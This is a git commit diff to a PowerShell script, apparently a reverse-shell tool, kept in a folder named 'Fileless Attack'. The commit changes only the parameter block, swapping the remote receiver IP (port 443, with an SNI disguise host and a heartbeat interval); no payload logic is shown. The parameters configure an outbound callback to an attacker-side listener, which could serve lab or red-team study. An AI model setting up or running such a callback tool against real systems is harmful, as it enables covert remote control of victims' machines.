8e8f80a029d2d5b066c7200bf47ef5a258ba1707
DominicWang <44692921+DominicWang10430187@users.noreply.github.com>
2025-09-10 17:06:45 +0800

    Add files via upload

--- Fileless Attack/DominicReverse.ps1
+++ Fileless Attack/DominicReverse.ps1
@@ -1,5 +1,5 @@
 param(
-  [string]$RemoteHost  = "10.10.38.48",  # 接收端 IP
+  [string]$RemoteHost  = "10.10.36.245",  # 接收端 IP
   [int]   $RemotePort  = 443,            # 接收端 Port
   [string]$SniHost     = "example.com",  # SNI/目標主機名（測試用）
   [int]   $IntervalSec = 5               # 心跳間隔秒數
